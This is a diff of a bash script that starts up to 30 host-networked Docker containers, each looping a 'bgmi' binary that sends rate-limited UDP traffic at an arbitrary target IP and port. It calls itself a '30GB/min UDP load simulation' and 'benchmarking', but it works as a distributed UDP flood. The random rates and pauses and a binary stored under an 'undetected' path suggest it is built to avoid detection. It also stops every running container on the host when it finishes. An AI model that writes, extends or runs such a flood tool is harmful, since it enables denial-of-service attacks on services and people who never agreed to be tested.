@@ -13,32 +13,41 @@ START_PORT="$2"
 DURATION="$3"
 CONTAINERS="${4:-30}"
 
-MIN_RATE_MBPS=8
-MAX_RATE_MBPS=45
+TOTAL_RATE_MBPS=512  # 512 MBps = 30 GB/min
 
-# Calculate target per container
-TOTAL_RATE_MBPS=5400  # 45 Gbps ≈ 5400 MBps
 RATE_PER_CONTAINER=$((TOTAL_RATE_MBPS / CONTAINERS))
 
-echo "[*] Starting 45Gbps UDP load simulation to $TARGET..."
+echo "[*] Starting 30GB/min UDP load simulation to $TARGET..."
 
 # Build the Docker image
-docker build -t udp-sim .
+docker build -t bgmi .
 
 # Run multiple containers to distribute the load
 for i in $(seq 1 "$CONTAINERS"); do
   PORT=$((START_PORT + i))
-  RATE=$((RANDOM % (MAX_RATE_MBPS - MIN_RATE_MBPS + 1) + MIN_RATE_MBPS))
-  LOGFILE="logs/bgmi-$i.log"
+  RATE=$((RANDOM % (RATE_PER_CONTAINER + 1)))
 
-  docker run -d --name bgmi-runner-$i --network host udp-sim bash -c "
+  LOGFILE="logs/bgmi.log"
+
+  docker run -d \
+  --name bgmi-runner-$i \
+  --network host \
+  -v /workspaces/undetected/undetected/logs:/logs \
+  bgmi bash -c "
     while true; do
-      echo \"[INFO][bgmi-$i] Benchmarking to $TARGET:$PORT @ ${RATE}MBps for ${DURATION}s\" >> /logs/bgmi-$i.log
-      /usr/local/bin/bgmi --ip $TARGET --port $PORT --rate-limit ${RATE}MBps --duration $DURATION >> /logs/bgmi-$i.log 2>&1
-      echo \"[INFO][bgmi-$i] Sleeping for random pause...\" >> /logs/bgmi-$i.log
+      echo \"[INFO][bgmi] Benchmarking to $TARGET:$PORT @ ${RATE}MBps for ${DURATION}s\" >> /logs/bgmi.log
+      /workspaces/undetected/undetected/bgmi -p 1000 -t 8 --ip $TARGET --port $PORT --rate-limit ${RATE}MBps --duration $DURATION >> /logs/bgmi.log 2>&1
+      echo \"[INFO][bgmi] Sleeping for random pause...\" >> /logs/bgmi.log
       sleep \$((RANDOM % 3 + 2))  # Random sleep between 2 to 5 seconds
     done
   "
 done
 
-echo "[✓] Simulated 45Gbps UDP load via $CONTAINERS containers."
+# Wait for benchmarking to finish (sleep for the duration of the benchmark)
+sleep "$DURATION"
+
+# Stop all running Docker containers
+echo "[*] Stopping all running Docker containers..."
+docker stop $(docker ps -q)
+
+echo "[✓] Simulated 30GB/min UDP load via $CONTAINERS containers and stopped all containers."
